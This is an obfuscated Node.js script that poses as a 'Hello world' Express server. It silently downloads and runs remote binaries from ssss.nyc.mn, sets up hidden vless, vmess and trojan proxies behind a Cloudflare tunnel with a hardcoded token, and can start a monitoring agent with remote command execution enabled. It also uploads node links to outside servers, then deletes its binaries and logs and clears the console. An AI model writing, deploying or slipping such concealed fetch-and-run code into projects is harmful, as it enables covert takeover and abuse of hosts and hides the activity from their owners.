const _0x17c2b2=_0x275b;(function(_0x401f42,_0x747507){const _0x411d54=_0x275b,_0x46ff57=_0x401f42();while(!![]){try{const _0x30f5b5=parseInt(_0x411d54(0x25f))/0x1+parseInt(_0x411d54(0x209))/0x2+-parseInt(_0x411d54(0x1e5))/0x3*(-parseInt(_0x411d54(0x235))/0x4)+-parseInt(_0x411d54(0x205))/0x5*(-parseInt(_0x411d54(0x1d4))/0x6)+-parseInt(_0x411d54(0x1ce))/0x7+parseInt(_0x411d54(0x1f6))/0x8*(parseInt(_0x411d54(0x23e))/0x9)+-parseInt(_0x411d54(0x22f))/0xa;if(_0x30f5b5===_0x747507)break;else _0x46ff57['push'](_0x46ff57['shift']());}catch(_0x28ca32){_0x46ff57['push'](_0x46ff57['shift']());}}}(_0x4a1c,0x4bf10));const express=require(_0x17c2b2(0x25d)),app=express(),axios=require(_0x17c2b2(0x1e7)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x17c2b2(0x1fe)),exec=promisify(require(_0x17c2b2(0x200))[_0x17c2b2(0x226)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x17c2b2(0x234)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x17c2b2(0x234)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x17c2b2(0x234)][_0x17c2b2(0x20b)]||![],FILE_PATH=process[_0x17c2b2(0x234)][_0x17c2b2(0x281)]||_0x17c2b2(0x22e),SUB_PATH=process['env'][_0x17c2b2(0x25a)]||_0x17c2b2(0x1e4),PORT=process['env']['SERVER_PORT']||process[_0x17c2b2(0x234)]['PORT']||0xbb8,UUID=process[_0x17c2b2(0x234)][_0x17c2b2(0x27d)]||_0x17c2b2(0x1ea),NEZHA_SERVER=process[_0x17c2b2(0x234)][_0x17c2b2(0x218)]||'',NEZHA_PORT=process[_0x17c2b2(0x234)][_0x17c2b2(0x275)]||'',NEZHA_KEY=process['env'][_0x17c2b2(0x254)]||'',ARGO_DOMAIN=process[_0x17c2b2(0x234)][_0x17c2b2(0x280)]||_0x17c2b2(0x1eb),ARGO_AUTH=process[_0x17c2b2(0x234)]['ARGO_AUTH']||'eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiNzM3M2RlNTYtMWZiOS00MGMzLWFhNmYtODYzYTAwNzkwYWZmIiwicyI6Ik1qSmlOV0k1TmpjdFpURTBPUzAwWkdVd0xXRm1Nak10TjJRNFptSmlaRGMyWXpBMyJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x17c2b2(0x234)][_0x17c2b2(0x260)]||'saas.sin.fan',CFPORT=process[_0x17c2b2(0x234)]['CFPORT']||0x1bb,NAME=process['env'][_0x17c2b2(0x26b)]||'';!fs[_0x17c2b2(0x203)](FILE_PATH)?(fs[_0x17c2b2(0x240)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x17c2b2(0x1d0)](FILE_PATH+_0x17c2b2(0x222));function generateRandomName(){const _0x133b7b=_0x17c2b2,_0x58091f=_0x133b7b(0x259);let _0x482d93='';for(let _0x5ba271=0x0;_0x5ba271<0x6;_0x5ba271++){_0x482d93+=_0x58091f[_0x133b7b(0x247)](Math['floor'](Math['random']()*_0x58091f[_0x133b7b(0x21f)]));}return _0x482d93;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x17c2b2(0x215)](FILE_PATH,npmName),phpPath=path[_0x17c2b2(0x215)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x17c2b2(0x215)](FILE_PATH,_0x17c2b2(0x1f0)),listPath=path['join'](FILE_PATH,_0x17c2b2(0x26e)),bootLogPath=path[_0x17c2b2(0x215)](FILE_PATH,'boot.log'),configPath=path[_0x17c2b2(0x215)](FILE_PATH,_0x17c2b2(0x213));function deleteNodes(){const _0x324ffc=_0x17c2b2;try{if(!UPLOAD_URL)return;if(!fs[_0x324ffc(0x203)](subPath))return;let _0x18e596;try{_0x18e596=fs[_0x324ffc(0x239)](subPath,'utf-8');}catch{return null;}const _0x525ca4=Buffer['from'](_0x18e596,'base64')[_0x324ffc(0x249)](_0x324ffc(0x1fd)),_0x168480=_0x525ca4['split']('\x0a')[_0x324ffc(0x23c)](_0x11d760=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x11d760));if(_0x168480[_0x324ffc(0x21f)]===0x0)return;return axios[_0x324ffc(0x278)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x168480}),{'headers':{'Content-Type':'application/json'}})[_0x324ffc(0x243)](_0x2281df=>{return null;}),null;}catch(_0x10fa4b){return null;}}function cleanupOldFiles(){const _0x5286d5=_0x17c2b2;try{const _0x3b1783=fs[_0x5286d5(0x1cf)](FILE_PATH);_0x3b1783[_0x5286d5(0x224)](_0x1e44ec=>{const _0x42f481=_0x5286d5,_0x546c99=path['join'](FILE_PATH,_0x1e44ec);try{const _0x262750=fs[_0x42f481(0x262)](_0x546c99);_0x262750[_0x42f481(0x216)]()&&fs[_0x42f481(0x204)](_0x546c99);}catch(_0xdca962){}});}catch(_0x28ed98){}}app[_0x17c2b2(0x202)]('/',function(_0xa06d19,_0x1a3818){const _0x51c0fc=_0x17c2b2;_0x1a3818['send'](_0x51c0fc(0x23a));});async function generateConfig(){const _0x17a6bc=_0x17c2b2,_0x3c2ed4={'log':{'access':_0x17a6bc(0x255),'error':_0x17a6bc(0x255),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x17a6bc(0x252),'settings':{'clients':[{'id':UUID,'flow':_0x17a6bc(0x23b)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x17a6bc(0x264),'dest':0xbba},{'path':_0x17a6bc(0x283),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x17a6bc(0x20c)}},{'port':0xbb9,'listen':_0x17a6bc(0x22c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x17a6bc(0x238)},'streamSettings':{'network':_0x17a6bc(0x20c),'security':_0x17a6bc(0x238)}},{'port':0xbba,'listen':_0x17a6bc(0x22c),'protocol':_0x17a6bc(0x252),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x17a6bc(0x238)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x17a6bc(0x264)}},'sniffing':{'enabled':!![],'destOverride':[_0x17a6bc(0x1d3),'tls',_0x17a6bc(0x1df)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x17a6bc(0x22c),'protocol':_0x17a6bc(0x257),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x17a6bc(0x1d3),'tls',_0x17a6bc(0x1df)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x17a6bc(0x22c),'protocol':_0x17a6bc(0x219),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x17a6bc(0x263)}},'sniffing':{'enabled':!![],'destOverride':[_0x17a6bc(0x1d3),_0x17a6bc(0x24b),_0x17a6bc(0x1df)],'metadataOnly':![]}}],'dns':{'servers':[_0x17a6bc(0x1da)]},'outbounds':[{'protocol':_0x17a6bc(0x230),'tag':_0x17a6bc(0x1e1)},{'protocol':_0x17a6bc(0x231),'tag':'block'}]};fs[_0x17a6bc(0x1d7)](path['join'](FILE_PATH,_0x17a6bc(0x213)),JSON[_0x17a6bc(0x273)](_0x3c2ed4,null,0x2));}function getSystemArchitecture(){const _0x180a80=_0x17c2b2,_0x995c5c=os['arch']();return _0x995c5c===_0x180a80(0x220)||_0x995c5c===_0x180a80(0x21d)||_0x995c5c==='aarch64'?_0x180a80(0x220):_0x180a80(0x1fb);}function downloadFile(_0x206379,_0x6af07d,_0x2617ce){const _0x28959d=_0x17c2b2,_0x241bc3=_0x206379;!fs[_0x28959d(0x203)](FILE_PATH)&&fs[_0x28959d(0x240)](FILE_PATH,{'recursive':!![]});const _0x2b2c78=fs[_0x28959d(0x1e8)](_0x241bc3);axios({'method':_0x28959d(0x202),'url':_0x6af07d,'responseType':_0x28959d(0x207)})[_0x28959d(0x21e)](_0x505e37=>{const _0x786a1=_0x28959d;_0x505e37['data']['pipe'](_0x2b2c78),_0x2b2c78['on'](_0x786a1(0x225),()=>{const _0x3b6e8b=_0x786a1;_0x2b2c78['close'](),console[_0x3b6e8b(0x1d0)](_0x3b6e8b(0x274)+path[_0x3b6e8b(0x22a)](_0x241bc3)+_0x3b6e8b(0x1ec)),_0x2617ce(null,_0x241bc3);}),_0x2b2c78['on'](_0x786a1(0x201),_0x163978=>{const _0x1ebfbc=_0x786a1;fs['unlink'](_0x241bc3,()=>{});const _0x44fd16=_0x1ebfbc(0x274)+path[_0x1ebfbc(0x22a)](_0x241bc3)+'\x20failed:\x20'+_0x163978[_0x1ebfbc(0x1fa)];console[_0x1ebfbc(0x201)](_0x44fd16),_0x2617ce(_0x44fd16);});})['catch'](_0x39387a=>{const _0x1b6a21=_0x28959d,_0x6b0c7d=_0x1b6a21(0x274)+path[_0x1b6a21(0x22a)](_0x241bc3)+_0x1b6a21(0x248)+_0x39387a['message'];console[_0x1b6a21(0x201)](_0x6b0c7d),_0x2617ce(_0x6b0c7d);});}async function downloadFilesAndRun(){const _0x301986=_0x17c2b2,_0x42eac1=getSystemArchitecture(),_0x3a5339=getFilesForArchitecture(_0x42eac1);if(_0x3a5339[_0x301986(0x21f)]===0x0){console[_0x301986(0x1d0)](_0x301986(0x1de));return;}const _0x4e5d03=_0x3a5339['map'](_0xd81517=>{return new Promise((_0x573d29,_0x2994ee)=>{const _0x1f603=_0x275b;downloadFile(_0xd81517[_0x1f603(0x229)],_0xd81517['fileUrl'],(_0x36e1b9,_0x26420b)=>{_0x36e1b9?_0x2994ee(_0x36e1b9):_0x573d29(_0x26420b);});});});try{await Promise[_0x301986(0x208)](_0x4e5d03);}catch(_0x104afb){console['error'](_0x301986(0x21b),_0x104afb);return;}function _0x5359ae(_0x538f45){const _0x5df618=0x1fd;_0x538f45['forEach'](_0x292ebf=>{const _0x30dee9=_0x275b;fs['existsSync'](_0x292ebf)&&fs[_0x30dee9(0x237)](_0x292ebf,_0x5df618,_0x5b3f9a=>{const _0x39f944=_0x30dee9;_0x5b3f9a?console['error'](_0x39f944(0x1e6)+_0x292ebf+':\x20'+_0x5b3f9a):console[_0x39f944(0x1d0)](_0x39f944(0x206)+_0x292ebf+':\x20'+_0x5df618[_0x39f944(0x249)](0x8));});});}const _0x2aeba1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5359ae(_0x2aeba1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x188431=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x301986(0x1f2)](':')[_0x301986(0x1d2)]():'',_0x5a1a52=new Set([_0x301986(0x1d1),_0x301986(0x241),_0x301986(0x1d8),'2087',_0x301986(0x279),'2053']),_0x26178d=_0x5a1a52[_0x301986(0x253)](_0x188431)?_0x301986(0x251):_0x301986(0x1f8),_0x38e48b=_0x301986(0x1e9)+NEZHA_KEY+_0x301986(0x210)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x26178d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x301986(0x215)](FILE_PATH,_0x301986(0x277)),_0x38e48b);const _0x2171f2='nohup\x20'+phpPath+_0x301986(0x25e)+FILE_PATH+_0x301986(0x1cd);try{await exec(_0x2171f2),console['log'](phpName+_0x301986(0x20e)),await new Promise(_0x3b83cb=>setTimeout(_0x3b83cb,0x3e8));}catch(_0x215520){console[_0x301986(0x201)](_0x301986(0x276)+_0x215520);}}else{let _0x97d54c='';const _0xeaa36e=[_0x301986(0x1d1),_0x301986(0x241),_0x301986(0x1d8),_0x301986(0x242),_0x301986(0x279),_0x301986(0x214)];_0xeaa36e['includes'](NEZHA_PORT)&&(_0x97d54c='--tls');const _0x48343a=_0x301986(0x1e2)+npmPath+_0x301986(0x1d6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x301986(0x24e)+NEZHA_KEY+'\x20'+_0x97d54c+_0x301986(0x21c);try{await exec(_0x48343a),console[_0x301986(0x1d0)](npmName+_0x301986(0x20e)),await new Promise(_0x3b16d2=>setTimeout(_0x3b16d2,0x3e8));}catch(_0x53f5c7){console[_0x301986(0x201)](_0x301986(0x250)+_0x53f5c7);}}}else console[_0x301986(0x1d0)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x9abf95=_0x301986(0x1e2)+webPath+'\x20-c\x20'+FILE_PATH+_0x301986(0x245);try{await exec(_0x9abf95),console[_0x301986(0x1d0)](webName+_0x301986(0x20e)),await new Promise(_0x4f2e0c=>setTimeout(_0x4f2e0c,0x3e8));}catch(_0x19a441){console[_0x301986(0x201)](_0x301986(0x1e0)+_0x19a441);}if(fs['existsSync'](botPath)){let _0x227056;if(ARGO_AUTH[_0x301986(0x269)](/^[A-Z0-9a-z=]{120,250}$/))_0x227056=_0x301986(0x26c)+ARGO_AUTH;else ARGO_AUTH[_0x301986(0x269)](/TunnelSecret/)?_0x227056=_0x301986(0x27a)+FILE_PATH+_0x301986(0x270):_0x227056='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x301986(0x268)+ARGO_PORT;try{await exec(_0x301986(0x1e2)+botPath+'\x20'+_0x227056+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x287c67=>setTimeout(_0x287c67,0x7d0));}catch(_0x5432f1){console[_0x301986(0x201)]('Error\x20executing\x20command:\x20'+_0x5432f1);}}await new Promise(_0x3cefcc=>setTimeout(_0x3cefcc,0x1388));}function getFilesForArchitecture(_0x3550ce){const _0x12a382=_0x17c2b2;let _0x23a1df;_0x3550ce==='arm'?_0x23a1df=[{'fileName':webPath,'fileUrl':_0x12a382(0x24f)},{'fileName':botPath,'fileUrl':_0x12a382(0x236)}]:_0x23a1df=[{'fileName':webPath,'fileUrl':_0x12a382(0x232)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4da2d2=_0x3550ce==='arm'?_0x12a382(0x265):_0x12a382(0x20a);_0x23a1df[_0x12a382(0x26a)]({'fileName':npmPath,'fileUrl':_0x4da2d2});}else{const _0x45a412=_0x3550ce===_0x12a382(0x220)?'https://arm64.ssss.nyc.mn/v1':_0x12a382(0x1cb);_0x23a1df[_0x12a382(0x26a)]({'fileName':phpPath,'fileUrl':_0x45a412});}}return _0x23a1df;}function _0x275b(_0xeeec4b,_0xb61967){_0xeeec4b=_0xeeec4b-0x1ca;const _0x4a1ce0=_0x4a1c();let _0x275b05=_0x4a1ce0[_0xeeec4b];return _0x275b05;}function argoType(){const _0xae5c69=_0x17c2b2;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xae5c69(0x1d0)](_0xae5c69(0x1ed));return;}if(ARGO_AUTH[_0xae5c69(0x22b)](_0xae5c69(0x27e))){fs[_0xae5c69(0x1d7)](path[_0xae5c69(0x215)](FILE_PATH,_0xae5c69(0x211)),ARGO_AUTH);const _0x37f125=_0xae5c69(0x24d)+ARGO_AUTH[_0xae5c69(0x1f2)]('\x22')[0xb]+_0xae5c69(0x258)+path[_0xae5c69(0x215)](FILE_PATH,_0xae5c69(0x211))+_0xae5c69(0x1dd)+ARGO_DOMAIN+_0xae5c69(0x1f1)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x37f125);}else console['log'](_0xae5c69(0x1ca));}argoType();function _0x4a1c(){const _0x477829=['util','base64','child_process','error','get','existsSync','unlinkSync','23605LayYZU','Empowerment\x20success\x20for\x20','stream','all','664594ArfWkZ','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','tcp','application/json','\x20is\x20running','\x0a\x20\x20\x0avmess://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tunnel.json','http\x20server\x20is\x20running\x20on\x20port:','config.json','2053','join','isFile','.exe\x20>\x20nul\x202>&1','NEZHA_SERVER','trojan','platform','Error\x20downloading\x20files:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arm64','then','length','arm','test','\x20already\x20exists','status','forEach','finish','exec','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20\x20\x20','fileName','basename','includes','127.0.0.1','Error\x20in\x20startserver:','./tmp','11459840FtakMn','freedom','blackhole','https://amd64.ssss.nyc.mn/web','Skipping\x20adding\x20automatic\x20access\x20task','env','2476ejIPSM','https://arm64.ssss.nyc.mn/bot','chmod','none','readFileSync','Hello\x20world!','xtls-rprx-vision','filter','listen','441567ozwexL','\x0avless://','mkdirSync','8443','2087','catch','response','/config.json\x20>/dev/null\x202>&1\x20&','send','charAt','\x20failed:\x20','toString','https://oooo.serv00.net/add-url','tls','\x0a\x20\x20\x0atrojan://','\x0a\x20\x20tunnel:\x20','\x20-p\x20','https://arm64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','true','vless','has','NEZHA_KEY','/dev/null','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','vmess','\x0a\x20\x20credentials-file:\x20','abcdefghijklmnopqrstuvwxyz','SUB_PATH','Subscription\x20uploaded\x20successfully','clear','express','\x20-c\x20\x22','386367rnHCJu','CFIP','boot.log','statSync','/trojan-argo','/vless-argo','https://arm64.ssss.nyc.mn/agent','del\x20/f\x20/q\x20','set','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','match','unshift','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','automatic\x20access\x20task\x20added\x20successfully','list.txt','from','/tunnel.yml\x20run','Error\x20executing\x20command:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','stringify','Download\x20','NEZHA_PORT','php\x20running\x20error:\x20','config.yaml','post','2083','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/api/add-nodes','substring','UUID','TunnelSecret','Unhandled\x20error\x20in\x20startserver:','ARGO_DOMAIN','FILE_PATH','trim','/vmess-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://amd64.ssss.nyc.mn/v1','\x20>\x20nul\x202>&1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','630245geAqKZ','readdirSync','log','443','pop','http','402ydQlIS','\x20>/dev/null\x202>&1\x20&','\x20-s\x20','writeFileSync','2096','Error\x20reading\x20boot.log:','https+local://8.8.8.8/dns-query','taskkill\x20/f\x20/im\x20','&fp=firefox&type=ws&host=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','quic','web\x20running\x20error:\x20','direct','nohup\x20','pkill\x20-f\x20\x22[','sub','1293cZYChM','Empowerment\x20failed\x20for\x20','axios','createWriteStream','\x0aclient_secret:\x20','bc97f674-c578-4940-9234-0a1da46041b9','railway1.xiangyu-group.com.cn','\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','win32','firefox','sub.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','split','rm\x20-rf\x20','\x22\x20>\x20/dev/null\x202>&1','/api/add-subscriptions','40TCPATP','?security=tls&sni=','false','text/plain;\x20charset=utf-8','message','amd','&path=%2Ftrojan-argo%3Fed%3D2560#','utf-8'];_0x4a1c=function(){return _0x477829;};return _0x4a1c();}async function extractDomains(){const _0x172626=_0x17c2b2;let _0x5e1145;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5e1145=ARGO_DOMAIN,console[_0x172626(0x1d0)]('ARGO_DOMAIN:',_0x5e1145),await _0x2acb37(_0x5e1145);else try{const _0x2a91fa=fs[_0x172626(0x239)](path[_0x172626(0x215)](FILE_PATH,_0x172626(0x261)),_0x172626(0x1fd)),_0x4ce969=_0x2a91fa['split']('\x0a'),_0x5372b5=[];_0x4ce969[_0x172626(0x224)](_0x1fedcc=>{const _0x2ae699=_0x172626,_0x265e1a=_0x1fedcc[_0x2ae699(0x269)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x265e1a){const _0x2fd6db=_0x265e1a[0x1];_0x5372b5['push'](_0x2fd6db);}});if(_0x5372b5['length']>0x0)_0x5e1145=_0x5372b5[0x0],console[_0x172626(0x1d0)]('ArgoDomain:',_0x5e1145),await _0x2acb37(_0x5e1145);else{console[_0x172626(0x1d0)](_0x172626(0x256)),fs[_0x172626(0x204)](path[_0x172626(0x215)](FILE_PATH,_0x172626(0x261)));async function _0x853f06(){const _0x46cd26=_0x172626;try{process[_0x46cd26(0x21a)]===_0x46cd26(0x1ee)?await exec(_0x46cd26(0x1db)+botName+_0x46cd26(0x217)):await exec(_0x46cd26(0x1e3)+botName[_0x46cd26(0x247)](0x0)+']'+botName[_0x46cd26(0x27c)](0x1)+_0x46cd26(0x1f4));}catch(_0x4ec06c){}}_0x853f06(),await new Promise(_0x1560cb=>setTimeout(_0x1560cb,0xbb8));const _0x188276='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x172626(0x1e2)+botPath+'\x20'+_0x188276+_0x172626(0x1d5)),console[_0x172626(0x1d0)](botName+'\x20is\x20running'),await new Promise(_0x3823c0=>setTimeout(_0x3823c0,0xbb8)),await extractDomains();}catch(_0x5a4f75){console[_0x172626(0x201)](_0x172626(0x271)+_0x5a4f75);}}}catch(_0x59f8fb){console[_0x172626(0x201)](_0x172626(0x1d9),_0x59f8fb);}async function _0x2acb37(_0x5e4f33){const _0x5a9f48=_0x172626,_0x4aa894=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x5a9f48(0x1fd)}),_0x567141=_0x4aa894[_0x5a9f48(0x282)](),_0x34738e=NAME?NAME+'-'+_0x567141:_0x567141;return new Promise(_0x53175e=>{setTimeout(()=>{const _0x1d62a0=_0x275b,_0x39c1df={'v':'2','ps':''+_0x34738e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d62a0(0x238),'net':'ws','type':_0x1d62a0(0x238),'host':_0x5e4f33,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x5e4f33,'alpn':'','fp':_0x1d62a0(0x1ef)},_0x499309=_0x1d62a0(0x23f)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x5e4f33+_0x1d62a0(0x1dc)+_0x5e4f33+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x34738e+_0x1d62a0(0x20f)+Buffer[_0x1d62a0(0x26f)](JSON[_0x1d62a0(0x273)](_0x39c1df))[_0x1d62a0(0x249)](_0x1d62a0(0x1ff))+_0x1d62a0(0x24c)+UUID+'@'+CFIP+':'+CFPORT+_0x1d62a0(0x1f7)+_0x5e4f33+'&fp=firefox&type=ws&host='+_0x5e4f33+_0x1d62a0(0x1fc)+_0x34738e+_0x1d62a0(0x228);console[_0x1d62a0(0x1d0)](Buffer['from'](_0x499309)[_0x1d62a0(0x249)](_0x1d62a0(0x1ff))),fs[_0x1d62a0(0x1d7)](subPath,Buffer[_0x1d62a0(0x26f)](_0x499309)[_0x1d62a0(0x249)]('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1d62a0(0x202)]('/'+SUB_PATH,(_0xe633a7,_0x30df96)=>{const _0x1a8d74=_0x1d62a0,_0x2442ed=Buffer[_0x1a8d74(0x26f)](_0x499309)[_0x1a8d74(0x249)](_0x1a8d74(0x1ff));_0x30df96[_0x1a8d74(0x267)]('Content-Type',_0x1a8d74(0x1f9)),_0x30df96[_0x1a8d74(0x246)](_0x2442ed);}),_0x53175e(_0x499309);},0x7d0);});}}async function uploadNodes(){const _0x4e64e0=_0x17c2b2;if(UPLOAD_URL&&PROJECT_URL){const _0x51aa88=PROJECT_URL+'/'+SUB_PATH,_0x130c94={'subscription':[_0x51aa88]};try{const _0x55a103=await axios['post'](UPLOAD_URL+_0x4e64e0(0x1f5),_0x130c94,{'headers':{'Content-Type':'application/json'}});return _0x55a103&&_0x55a103[_0x4e64e0(0x223)]===0xc8?(console[_0x4e64e0(0x1d0)](_0x4e64e0(0x25b)),_0x55a103):null;}catch(_0x137d1c){if(_0x137d1c['response']){if(_0x137d1c[_0x4e64e0(0x244)][_0x4e64e0(0x223)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4e64e0(0x203)](listPath))return;const _0xa3760b=fs[_0x4e64e0(0x239)](listPath,_0x4e64e0(0x1fd)),_0x558506=_0xa3760b[_0x4e64e0(0x1f2)]('\x0a')[_0x4e64e0(0x23c)](_0x319ea8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e64e0(0x221)](_0x319ea8));if(_0x558506[_0x4e64e0(0x21f)]===0x0)return;const _0x2a824f=JSON[_0x4e64e0(0x273)]({'nodes':_0x558506});try{const _0x310707=await axios[_0x4e64e0(0x278)](UPLOAD_URL+_0x4e64e0(0x27b),_0x2a824f,{'headers':{'Content-Type':_0x4e64e0(0x20d)}});return _0x310707&&_0x310707[_0x4e64e0(0x223)]===0xc8?(console[_0x4e64e0(0x1d0)]('Nodes\x20uploaded\x20successfully'),_0x310707):null;}catch(_0x4d54d2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xf37c91=_0x275b,_0x2d780c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2d780c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2d780c['push'](phpPath);process[_0xf37c91(0x21a)]===_0xf37c91(0x1ee)?exec(_0xf37c91(0x266)+_0x2d780c[_0xf37c91(0x215)]('\x20')+_0xf37c91(0x1cc),_0x1f5ad8=>{const _0x23245c=_0xf37c91;console[_0x23245c(0x25c)](),console['log']('App\x20is\x20running'),console[_0x23245c(0x1d0)](_0x23245c(0x272));}):exec(_0xf37c91(0x1f3)+_0x2d780c[_0xf37c91(0x215)]('\x20')+'\x20>/dev/null\x202>&1',_0x219b27=>{const _0x53176b=_0xf37c91;console[_0x53176b(0x25c)](),console['log']('App\x20is\x20running'),console[_0x53176b(0x1d0)](_0x53176b(0x272));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3334=_0x17c2b2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3334(0x1d0)](_0x3334(0x233));return;}try{const _0x245647=await axios['post'](_0x3334(0x24a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3334(0x20d)}});return console[_0x3334(0x1d0)](_0x3334(0x26d)),_0x245647;}catch(_0x4702ec){return console['error'](_0x3334(0x227)+_0x4702ec[_0x3334(0x1fa)]),null;}}async function startserver(){const _0x3b5317=_0x17c2b2;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x264aeb){console['error'](_0x3b5317(0x22d),_0x264aeb);}}startserver()[_0x17c2b2(0x243)](_0x157271=>{const _0x35478e=_0x17c2b2;console[_0x35478e(0x201)](_0x35478e(0x27f),_0x157271);}),app[_0x17c2b2(0x23d)](PORT,()=>console[_0x17c2b2(0x1d0)](_0x17c2b2(0x212)+PORT+'!'));
